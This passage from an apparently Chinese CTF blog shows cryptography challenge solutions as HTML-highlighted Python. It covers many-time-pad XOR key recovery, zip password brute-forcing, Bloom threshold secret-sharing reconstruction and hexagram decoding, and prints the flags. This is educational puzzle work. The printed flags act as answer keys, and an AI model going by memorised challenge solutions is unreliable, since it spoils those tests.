= [<span class="literal">None</span>] * <span class="number">150</span></span><br><span class="line">    <span class="comment"># To store the positions we know are broken</span></span><br><span class="line">    known_key_positions = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># For each ciphertext</span></span><br><span class="line">    <span class="keyword">for</span> current_index, ciphertext <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphers):</span><br><span class="line">        counter = collections.Counter()</span><br><span class="line">        <span class="comment"># for each other ciphertext</span></span><br><span class="line">        <span class="keyword">for</span> index, ciphertext2 <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphers):</span><br><span class="line">            <span class="keyword">if</span> current_index != index:  <span class="comment"># don&#x27;t xor a ciphertext with itself</span></span><br><span class="line">                <span class="keyword">for</span> indexOfChar, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(</span><br><span class="line">                        strxor(ciphertext.decode(<span class="string">&#x27;hex&#x27;</span>), ciphertext2.decode(<span class="string">&#x27;hex&#x27;</span>))):  <span class="comment"># Xor the two ciphertexts</span></span><br><span class="line">                    <span class="comment"># If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don&#x27;t know which one)</span></span><br><span class="line">                    <span class="keyword">if</span> char <span class="keyword">in</span> string.printable <span class="keyword">and</span> char.isalpha(): counter[</span><br><span class="line">                        indexOfChar] += <span class="number">1</span>  <span class="comment"># Increment the counter at this index</span></span><br><span class="line">        knownSpaceIndexes = []</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Loop through all positions where a space character was possible in the current_index cipher</span></span><br><span class="line">        <span class="keyword">for</span> ind, val <span class="keyword">in</span> counter.items():</span><br><span class="line">            <span class="comment"># If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!</span></span><br><span class="line">            <span class="keyword">if</span> val &gt;= <span class="number">7</span>: knownSpaceIndexes.append(ind)</span><br><span class="line">        <span class="comment"># print knownSpaceIndexes # Shows all the positions where we now know the key!</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!</span></span><br><span class="line">        xor_with_spaces = strxor(ciphertext.decode(<span class="string">&#x27;hex&#x27;</span>), <span class="string">&#x27; &#x27;</span> * <span class="number">150</span>)</span><br><span class="line">        <span class="keyword">for</span> index <span class="keyword">in</span> knownSpaceIndexes:</span><br><span class="line">            <span class="comment"># Store the key&#x27;s value at the correct position</span></span><br><span class="line">            final_key[index] = xor_with_spaces[index].encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">            <span class="comment"># Record that we known the key at this position</span></span><br><span class="line">            known_key_positions.add(index)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Construct a hex key from the currently known key, adding in &#x27;00&#x27; hex chars where we do not know (to make a complete hex string)</span></span><br><span class="line">    final_key_hex = <span class="string">&#x27;&#x27;</span>.join([val <span class="keyword">if</span> val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">&#x27;00&#x27;</span> <span class="keyword">for</span> val <span class="keyword">in</span> final_key])</span><br><span class="line">    <span class="comment"># Xor the currently known key with the target cipher</span></span><br><span class="line">    output = strxor(target_cipher.decode(<span class="string">&#x27;hex&#x27;</span>), final_key_hex.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Fix this sentence:&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join([char <span class="keyword">if</span> index <span class="keyword">in</span> known_key_positions <span class="keyword">else</span> <span class="string">&#x27;*&#x27;</span> <span class="keyword">for</span> index, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(output)]) + <span class="string">&quot;n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># WAIT.. MANUAL STEP HERE</span></span><br><span class="line">    <span class="comment"># This output are printing a * if that character is not known yet</span></span><br><span class="line">    <span class="comment"># fix the missing characters like this: &quot;Let*M**k*ow if *o&#123;*a&quot; = &quot;cure, Let Me know if you a&quot;</span></span><br><span class="line">    <span class="comment"># if is too hard, change the target_cipher to another one and try again</span></span><br><span class="line">    <span class="comment"># and we have our key to fix the entire text!</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># sys.exit(0) #comment and continue if u got a good key</span></span><br><span class="line"></span><br><span class="line">    target_plaintext = <span class="string">&quot;ever if the key is kept s&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Fixed:&quot;</span></span><br><span class="line">    <span class="built_in">print</span> target_plaintext + <span class="string">&quot;n&quot;</span></span><br><span class="line"></span><br><span class="line">    key = strxor(target_cipher.decode(<span class="string">&#x27;hex&#x27;</span>), target_plaintext)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Decrypted msg:&quot;</span></span><br><span class="line">    <span class="keyword">for</span> cipher <span class="keyword">in</span> ciphers:</span><br><span class="line">        <span class="built_in">print</span> strxor(cipher.decode(<span class="string">&#x27;hex&#x27;</span>), key)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;nPrivate key recovered: &quot;</span> + key + <span class="string">&quot;n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ciphers:</span><br><span class="line">    target_fix(i)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nPrivate key recovered: afctf&#123;OPT_1s_Int3rest1ng&#125;</span><br></pre></td></tr></table></figure><h2 id="密码混合"><a href="#密码混合" class="headerlink" title="密码混合"></a>密码混合</h2><blockquote><p>有些密码题目太融合了，看起来既不像是古典，又不想是现代，还有些misc的成分在其中，就将其分入此类之中，这一类的题目直接以三级标题命名。</p></blockquote><h3 id="AFCTF2018-花开藏宝地"><a href="#AFCTF2018-花开藏宝地" class="headerlink" title="[AFCTF2018]花开藏宝地"></a>[AFCTF2018]花开藏宝地</h3><p>给出了5个压缩包，应该是每个压缩包对应的都是一种知识点。</p><h4 id="Secret1"><a href="#Secret1" class="headerlink" title="Secret1"></a>Secret1</h4><p>直接对压缩包进行爆破，看起来这一关有些misc的成分混杂于其中了。key是<code>19260817</code></p><img src="/2021/05/28/CTF//image-20210729163233973.png" style="zoom:67%;"><h4 id="Secret2"><a href="#Secret2" class="headerlink" title="Secret2"></a>Secret2</h4><p>提示是人名，然后就是大小写字母喽，直接再爆破得key2:<code>alice</code></p><img src="/2021/05/28/CTF//image-20210729164351421.png" style="zoom: 67%;"><h4 id="Secret4"><a href="#Secret4" class="headerlink" title="Secret4"></a>Secret4</h4><p>zip伪加密，修改一下标志位即可。</p><h4 id="Bloom门限方案"><a href="#Bloom门限方案" class="headerlink" title="Bloom门限方案"></a>Bloom门限方案</h4><p><a href="https://webencrypt.org/secretsharing/#bloom">Bloom门限参考链接</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">a1 =<span class="number">100459779913520540098065407420629954816677926423356769524759072632219106155849450125185205557491138357760494272691949199099803239098119602186117878931534968435982565071570831032814288620974807498206233914826253433847572703407678712965098320122549759579566316372220959610814573945698083909575005303253205653244238542300266460559790606278310650849881421791081944960157781855164700773081375247</span></span><br><span class="line">d1 =<span class="number">347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820820091</span></span><br><span class="line">a2 =<span class="number">305345133911395218573790903508296238659147802274031796643017539011648802808763162902335644195648525375518941848430114497150082025133000033835083076541927530829557051524161069423494451667848236452337271862085346869364976989047180532167560796470067549915390773271207901537847213882479997325575278672917648417868759077150999044891099206133296336190476413164240995177077671480352739572539631359</span></span><br><span class="line">d2 =<span class="number">347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820813413</span></span><br><span class="line">a3 = <span class="number">152012681270682340051690627924586232702552460810030322267827401771304907469802591861912921281833890613186317787813611372838066924894691892444503039545946728621696590087591246339208248647926966446848123290344911662916758039134817404720512465817867255277476717353439505243247568126193361558042940352204093381260402400739429050280526212446967632582771424597203000629197487733610187359662268583</span></span><br><span class="line">d3 =<span class="number">347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820818553</span></span><br><span class="line"></span><br><span class="line">dd = d1*d2*d3</span><br><span class="line"></span><br><span class="line">t1 = <span class="built_in">pow</span>(dd//d1,d1-<span class="number">2</span>,d1)</span><br><span class="line"><span class="keyword">assert</span>(t1*d2*d3%d1 == <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">t2 = <span class="built_in">pow</span>(dd//d2,d2-<span class="number">2</span>,d2)</span><br><span class="line"><span class="keyword">assert</span>(t2*d1*d3%d2 == <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">t3 = <span class="built_in">pow</span>(dd//d3,d3-<span class="number">2</span>,d3)</span><br><span class="line"><span class="keyword">assert</span>(t3*d2*d1%d3 == <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">s = a1*t1*d2*d3+a2*t2*d1*d3+a3*t3*d1*d2</span><br><span class="line">p = <span class="number">80804238007977405688648566160504278593148666302626415149704905628622876270862865768337953835725801963142685182510812938072115996355782396318303927020705623120652014080032809421180400984242061592520733710243483947230962631945045134540159517488288781666622635328316972979183761952842010806304748313326215619695085380586052550443025074501971925005072999275628549710915357400946408857</span></span><br><span class="line">s %= dd</span><br><span class="line"><span class="comment"># print(hex(s))</span></span><br><span class="line">s %= p</span><br><span class="line">s = <span class="built_in">hex</span>(s)[<span class="number">2</span>:]</span><br><span class="line">flag = <span class="built_in">list</span>(<span class="built_in">bytearray</span>.fromhex(s))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># A treasure map is a map that marks the location of buried treasure, a lost mine, a valuable secret or a hidden locale. So flag is afctf&#123;1sn&#x27;t_s0_int3Resting&#125;.</span></span><br></pre></td></tr></table></figure><p><a href="http://www.matrix67.com/blog/archives/1261">参考链接</a></p><h4 id="BJDCTF2020-伏羲六十四卦"><a href="#BJDCTF2020-伏羲六十四卦" class="headerlink" title="[BJDCTF2020]伏羲六十四卦"></a>[BJDCTF2020]伏羲六十四卦</h4><p>给出的附件有个什么六十四卦的编码，我一看就懵逼了，这又是什么古怪的编码？官方wp给出的解码脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">enc=<span class="string">&#x27;升随临损巽睽颐萃小过讼艮颐小过震蛊屯未济中孚艮困恒晋升损蛊萃蛊未济巽解艮贲未济观豫损蛊晋噬嗑晋旅解大畜困未济随蒙升解睽未济井困未济旅萃未济震蒙未济师涣归妹大有&#x27;</span></span><br><span class="line">mydisc=&#123;<span class="string">&#x27;坤&#x27;</span>: <span class="string">&#x27;000000&#x27;</span>, <span class="string">&#x27;剥&#x27;</span>: <span class="string">&#x27;000001&#x27;</span>, <span class="string">&#x27;比&#x27;</span>: <span class="string">&#x27;000010&#x27;</span>, <span class="string">&#x27;观&#x27;</span>: <span class="string">&#x27;000011&#x27;</span>, <span class="string">&#x27;豫&#x27;</span>: <span class="string">&#x27;000100&#x27;</span>, <span class="string">&#x27;晋&#x27;</span>: <span class="string">&#x27;000101&#x27;</span>, <span class="string">&#x27;萃&#x27;</span>: <span class="string">&#x27;000110&#x27;</span>, <span class="string">&#x27;否&#x27;</span>: <span class="string">&#x27;000111&#x27;</span>, <span class="string">&#x27;谦&#x27;</span>: <span class="string">&#x27;001000&#x27;</span>, <span class="string">&#x27;艮&#x27;</span>: <span class="string">&#x27;001001&#x27;</span>, <span class="string">&#x27;蹇&#x27;</span>: <span class="string">&#x27;001010&#x27;</span>, <span class="string">&#x27;渐&#x27;</span>: <span class="string">&#x27;001011&#x27;</span>, <span class="string">&#x27;小过&#x27;</span>: <span class="string">&#x27;001100&#x27;</span>, <span class="string">&#x27;旅&#x27;</span>: <span class="string">&#x27;001101&#x27;</span>, <span class="string">&#x27;咸&#x27;</span>: <span class="string">&#x27;001110&#x27;</span>, <span class="string">&#x27;遁&#x27;</span>: <span class="string">&#x27;001111&#x27;</span>, <span class="string">&#x27;师&#x27;</span>: <span class="string">&#x27;010000&#x27;</span>, <span class="string">&#x27;蒙&#x27;</span>: <span class="string">&#x27;010001&#x27;</span>, <span class="string">&#x27;坎&#x27;</span>: <span class="string">&#x27;010010&#x27;</span>, <span class="string">&#x27;涣&#x27;</span>: <span class="string">&#x27;010011&#x27;</span>, <span class="string">&#x27;解&#x27;</span>: <span class="string">&#x27;010100&#x27;</span>, <span class="string">&#x27;未济&#x27;</span>: <span class="string">&#x27;010101&#x27;</span>, <span class="string">&#x27;困&#x27;</span>: <span class="string">&#x27;010110&#x27;</span>, <span class="string">&#x27;讼&#x27;</span>: <span class="string">&#x27;010111&#x27;</span>, <span class="string">&#x27;升&#x27;</span>: <span class="string">&#x27;011000&#x27;</span>, <span class="string">&#x27;蛊&#x27;</span>: <span class="string">&#x27;011001&#x27;</span>, <span class="string">&#x27;井&#x27;</span>: <span class="string">&#x27;011010&#x27;</span>, <span class="string">&#x27;巽&#x27;</span>: <span class="string">&#x27;011011&#x27;</span>, <span class="string">&#x27;恒&#x27;</span>: <span class="string">&#x27;011100&#x27;</span>, <span class="string">&#x27;鼎&#x27;</span>: <span class="string">&#x27;011101&#x27;</span>, <span class="string">&#x27;大过&#x27;</span>: <span class="string">&#x27;011110&#x27;</span>, <span class="string">&#x27;姤&#x27;</span>: <span class="string">&#x27;011111&#x27;</span>, <span class="string">&#x27;复&#x27;</span>: <span class="string">&#x27;100000&#x27;</span>, <span class="string">&#x27;颐&#x27;</span>: <span class="string">&#x27;100001&#x27;</span>, <span class="string">&#x27;屯&#x27;</span>: <span class="string">&#x27;100010&#x27;</span>, <span class="string">&#x27;益&#x27;</span>: <span class="string">&#x27;100011&#x27;</span>, <span class="string">&#x27;震&#x27;</span>: <span class="string">&#x27;100100&#x27;</span>, <span class="string">&#x27;噬嗑&#x27;</span>: <span class="string">&#x27;100101&#x27;</span>, <span class="string">&#x27;随&#x27;</span>: <span class="string">&#x27;100110&#x27;</span>, <span class="string">&#x27;无妄&#x27;</span>: <span class="string">&#x27;100111&#x27;</span>, <span class="string">&#x27;明夷&#x27;</span>: <span class="string">&#x27;101000&#x27;</span>, <span class="string">&#x27;贲&#x27;</span>: <span class="string">&#x27;101001&#x27;</span>, <span class="string">&#x27;既济&#x27;</span>: <span class="string">&#x27;101010&#x27;</span>, <span class="string">&#x27;家人&#x27;</span>: <span class="string">&#x27;101011&#x27;</span>, <span class="string">&#x27;丰&#x27;</span>: <span class="string">&#x27;101100&#x27;</span>, <span class="string">&#x27;离&#x27;</span>: <span class="string">&#x27;101101&#x27;</span>, <span class="string">&#x27;革&#x27;</span>: <span class="string">&#x27;101110&#x27;</span>, <span class="string">&#x27;同人&#x27;</span>: <span class="string">&#x27;101111&#x27;</span>, <span class="string">&#x27;临&#x27;</span>: <span class="string">&#x27;110000&#x27;</span>, <span class="string">&#x27;损&#x27;</span>: <span class="string">&#x27;110001&#x27;</span>, <span class="string">&#x27;节&#x27;</span>: <span class="string">&#x27;110010&#x27;</span>, <span class="string">&#x27;中孚&#x27;</span>: <span class="string">&#x27;110011&#x27;</span>, <span class="string">&#x27;归妹&#x27;</span>: <span class="string">&#x27;110100&#x27;</span>, <span class="string">&#x27;睽&#x27;</span>: <span class="string">&#x27;110101&#x27;</span>, <span class="string">&#x27;兑&#x27;</span>: <span class="string">&#x27;110110&#x27;</span>, <span class="string">&#x27;履&#x27;</span>: <span class="string">&#x27;110111&#x27;</span>, <span class="string">&#x27;泰&#x27;</span>: <span class="string">&#x27;111000&#x27;</span>, <span class="string">&#x27;大畜&#x27;</span>: <span class="string">&#x27;111001&#x27;</span>, <span class="string">&#x27;需&#x27;</span>: <span class="string">&#x27;111010&#x27;</span>, <span class="string">&#x27;小畜&#x27;</span>: <span class="string">&#x27;111011&#x27;</span>, <span class="string">&#x27;大壮&#x27;</span>: <span class="string">&#x27;111100&#x27;</span>, <span class="string">&#x27;大有&#x27;</span>: <span class="string">&#x27;111101&#x27;</span>, <span class="string">&#x27;夬&#x27;</span>: <span class="string">&#x27;111110&#x27;</span>, <span class="string">&#x27;乾&#x27;</span>: <span class="string">&#x27;111111&#x27;</span>&#125;</span><br><span class="line">keys=[<span class="string">&#x27;坤&#x27;</span>, <span class="string">&#x27;剥&#x27;</span>, <span class="string">&#x27;比&#x27;</span>, <span class="string">&#x27;观&#x27;</span>, <span class="string">&#x27;豫&#x27;</span>, <span class="string">&#x27;晋&#x27;</span>, <span class="string">&#x27;萃&#x27;</span>, <span class="string">&#x27;否&#x27;</span>, <span class="string">&#x27;谦&#x27;</span>, <span class="string">&#x27;艮&#x27;</span>, <span class="string">&#x27;蹇&#x27;</span>, <span class="string">&#x27;渐&#x27;</span>, <span class="string">&#x27;小过&#x27;</span>, <span class="string">&#x27;旅&#x27;</span>, <span class="string">&#x27;咸&#x27;</span>, <span class="string">&#x27;遁&#x27;</span>, <span class="string">&#x27;师&#x27;</span>, <span class="string">&#x27;蒙&#x27;</span>, <span class="string">&#x27;坎&#x27;</span>, <span class="string">&#x27;涣&#x27;</span>, <span class="string">&#x27;解&#x27;</span>, <span class="string">&#x27;未济&#x27;</span>, <span class="string">&#x27;困&#x27;</span>, <span class="string">&#x27;讼&#x27;</span>, <span class="string">&#x27;升&#x27;</span>, <span class="string">&#x27;蛊&#x27;</span>, <span class="string">&#x27;井&#x27;</span>, <span class="string">&#x27;巽&#x27;</span>, <span class="string">&#x27;恒&#x27;</span>, <span class="string">&#x27;鼎&#x27;</span>, <span class="string">&#x27;大过&#x27;</span>, <span class="string">&#x27;姤&#x27;</span>, <span class="string">&#x27;复&#x27;</span>, <span class="string">&#x27;颐&#x27;</span>, <span class="string">&#x27;屯&#x27;</span>, <span class="string">&#x27;益&#x27;</span>, <span class="string">&#x27;震&#x27;</span>, <span class="string">&#x27;噬嗑&#x27;</span>, <span class="string">&#x27;随&#x27;</span>, <span class="string">&#x27;无妄&#x27;</span>, <span class="string">&#x27;明夷&#x27;</span>, <span class="string">&#x27;贲&#x27;</span>, <span class="string">&#x27;既济&#x27;</span>, <span class="string">&#x27;家人&#x27;</span>, <span class="string">&#x27;丰&#x27;</span>, <span class="string">&#x27;离&#x27;</span>, <span class="string">&#x27;革&#x27;</span>, <span class="string">&#x27;同人&#x27;</span>, <span class="string">&#x27;临&#x27;</span>, <span class="string">&#x27;损&#x27;</span>, <span class="string">&#x27;节&#x27;</span>, <span class="string">&#x27;中孚&#x27;</span>, <span class="string">&#x27;归妹&#x27;</span>, <span class="string">&#x27;睽&#x27;</span>, <span class="string">&#x27;兑&#x27;</span>, <span class="string">&#x27;履&#x27;</span>, <span class="string">&#x27;泰&#x27;</span>, <span class="string">&#x27;大畜&#x27;</span>, <span class="string">&#x27;需&#x27;</span>, <span class="string">&#x27;小畜&#x27;</span>, <span class="string">&#x27;大壮&#x27;</span>, <span class="string">&#x27;大有&#x27;</span>, <span class="string">&#x27;夬&#x27;</span>, <span class="string">&#x27;乾&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>():</span><br><span class="line">    <span class="keyword">global</span> mingwen</span><br><span class="line">    mingwen=enc</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> keys:</span><br><span class="line">        mingwen=mingwen.replace(each,mydisc[each])</span><br><span class="line">    <span class="built_in">print</span>(mingwen)</span><br></pre></td></tr></table></figure><p>这有了之后，后面的解题过程挺简单的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&#x27;升随临损巽睽颐萃小过讼艮颐小过震蛊屯未济中孚艮困恒晋升损蛊萃蛊未济巽解艮贲未济观豫损蛊晋噬嗑晋旅解大畜困未济随蒙升解睽未济井困未济旅萃未济震蒙未济师涣归妹大有&#x27;</span></span><br><span class="line">mydisc = &#123;<span class="string">&#x27;坤&#x27;</span>: <span class="string">&#x27;000000&#x27;</span>, <span class="string">&#x27;剥&#x27;</span>: <span class="string">&#x27;000001&#x27;</span>, <span class="string">&#x27;比&#x27;</span>: <span class="string">&#x27;000010&#x27;</span>, <span class="string">&#x27;观&#x27;</span>: <span class="string">&#x27;000011&#x27;</span>, <span class="string">&#x27;豫&#x27;</span>: <span class="string">&#x27;000100&#x27;</span>, <span class="string">&#x27;晋&#x27;</span>: <span class="string">&#x27;000101&#x27;</span>, <span class="string">&#x27;萃&#x27;</span>: <span class="string">&#x27;000110&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;否&#x27;</span>: <span class="string">&#x27;000111&#x27;</span>, <span class="string">&#x27;谦&#x27;</span>: <span class="string">&#x27;001000&#x27;</span>, <span class="string">&#x27;艮&#x27;</span>: <span class="string">&#x27;001001&#x27;</span>, <span class="string">&#x27;蹇&#x27;</span>: <span class="string">&#x27;001010&#x27;</span>, <span class="string">&#x27;渐&#x27;</span>: <span class="string">&#x27;001011&#x27;</span>, <span class="string">&#x27;小过&#x27;</span>: <span class="string">&#x27;001100&#x27;</span>, <span class="string">&#x27;旅&#x27;</span>: <span class="string">&#x27;001101&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;咸&#x27;</span>: <span class="string">&#x27;001110&#x27;</span>, <span class="string">&#x27;遁&#x27;</span>: <span class="string">&#x27;001111&#x27;</span>, <span class="string">&#x27;师&#x27;</span>: <span class="string">&#x27;010000&#x27;</span>, <span class="string">&#x27;蒙&#x27;</span>: <span class="string">&#x27;010001&#x27;</span>, <span class="string">&#x27;坎&#x27;</span>: <span class="string">&#x27;010010&#x27;</span>, <span class="string">&#x27;涣&#x27;</span>: <span class="string">&#x27;010011&#x27;</span>, <span class="string">&#x27;解&#x27;</span>: <span class="string">&#x27;010100&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;未济&#x27;</span>: <span class="string">&#x27;010101&#x27;</span>, <span class="string">&#x27;困&#x27;</span>: <span class="string">&#x27;010110&#x27;</span>, <span class="string">&#x27;讼&#x27;</span>: <span class="string">&#x27;010111&#x27;</span>, <span class="string">&#x27;升&#x27;</span>: <span class="string">&#x27;011000&#x27;</span>, <span class="string">&#x27;蛊&#x27;</span>: <span class="string">&#x27;011001&#x27;</span>, <span class="string">&#x27;井&#x27;</span>: <span class="string">&#x27;011010&#x27;</span>, <span class="string">&#x27;巽&#x27;</span>: <span class="string">&#x27;011011&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;恒&#x27;</span>: <span class="string">&#x27;011100&#x27;</span>, <span class="string">&#x27;鼎&#x27;</span>: <span class="string">&#x27;011101&#x27;</span>, <span class="string">&#x27;大过&#x27;</span>: <span class="string">&#x27;011110&#x27;</span>, <span class="string">&#x27;姤&#x27;</span>: <span class="string">&#x27;011111&#x27;</span>, <span class="string">&#x27;复&#x27;</span>: <span class="string">&#x27;100000&#x27;</span>, <span class="string">&#x27;颐&#x27;</span>: <span class="string">&#x27;100001&#x27;</span>, <span class="string">&#x27;屯&#x27;</span>: <span class="string">&#x27;100010&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;益&#x27;</span>: <span class="string">&#x27;100011&#x27;</span>, <span class="string">&#x27;震&#x27;</span>: <span class="string">&#x27;100100&#x27;</span>, <span class="string">&#x27;噬嗑&#x27;</span>: <span class="string">&#x27;100101&#x27;</span>, <span class="string">&#x27;随&#x27;</span>: <span class="string">&#x27;100110&#x27;</span>, <span class="string">&#x27;无妄&#x27;</span>: <span class="string">&#x27;100111&#x27;</span>, <span class="string">&#x27;明夷&#x27;</span>: <span class="string">&#x27;101000&#x27;</span>, <span class="string">&#x27;贲&#x27;</span>: <span class="string">&#x27;101001&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;既济&#x27;</span>: <span class="string">&#x27;101010&#x27;</span>, <span class="string">&#x27;家人&#x27;</span>: <span class="string">&#x27;101011&#x27;</span>, <span class="string">&#x27;丰&#x27;</span>: <span class="string">&#x27;101100&#x27;</span>, <span class="string">&#x27;离&#x27;</span>: <span class="string">&#x27;101101&#x27;</span>, <span class="string">&#x27;革&#x27;</span>: <span class="string">&#x27;101110&#x27;</span>, <span class="string">&#x27;同人&#x27;</span>: <span class="string">&#x27;101111&#x27;</span>, <span class="string">&#x27;临&#x27;</span>: <span class="string">&#x27;110000&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;损&#x27;</span>: <span class="string">&#x27;110001&#x27;</span>, <span class="string">&#x27;节&#x27;</span>: <span class="string">&#x27;110010&#x27;</span>, <span class="string">&#x27;中孚&#x27;</span>: <span class="string">&#x27;110011&#x27;</span>, <span class="string">&#x27;归妹&#x27;</span>: <span class="string">&#x27;110100&#x27;</span>, <span class="string">&#x27;睽&#x27;</span>: <span class="string">&#x27;110101&#x27;</span>, <span class="string">&#x27;兑&#x27;</span>: <span class="string">&#x27;110110&#x27;</span>, <span class="string">&#x27;履&#x27;</span>: <span class="string">&#x27;110111&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;泰&#x27;</span>: <span class="string">&#x27;111000&#x27;</span>, <span class="string">&#x27;大畜&#x27;</span>: <span class="string">&#x27;111001&#x27;</span>, <span class="string">&#x27;需&#x27;</span>: <span class="string">&#x27;111010&#x27;</span>, <span class="string">&#x27;小畜&#x27;</span>: <span class="string">&#x27;111011&#x27;</span>, <span class="string">&#x27;大壮&#x27;</span>: <span class="string">&#x27;111100&#x27;</span>, <span class="string">&#x27;大有&#x27;</span>: <span class="string">&#x27;111101&#x27;</span>, <span class="string">&#x27;夬&#x27;</span>: <span class="string">&#x27;111110&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;乾&#x27;</span>: <span class="string">&#x27;111111&#x27;</span>&#125;</span><br><span class="line">keys = [<span class="string">&#x27;坤&#x27;</span>, <span class="string">&#x27;剥&#x27;</span>, <span class="string">&#x27;比&#x27;</span>, <span class="string">&#x27;观&#x27;</span>, <span class="string">&#x27;豫&#x27;</span>, <span class="string">&#x27;晋&#x27;</span>, <span 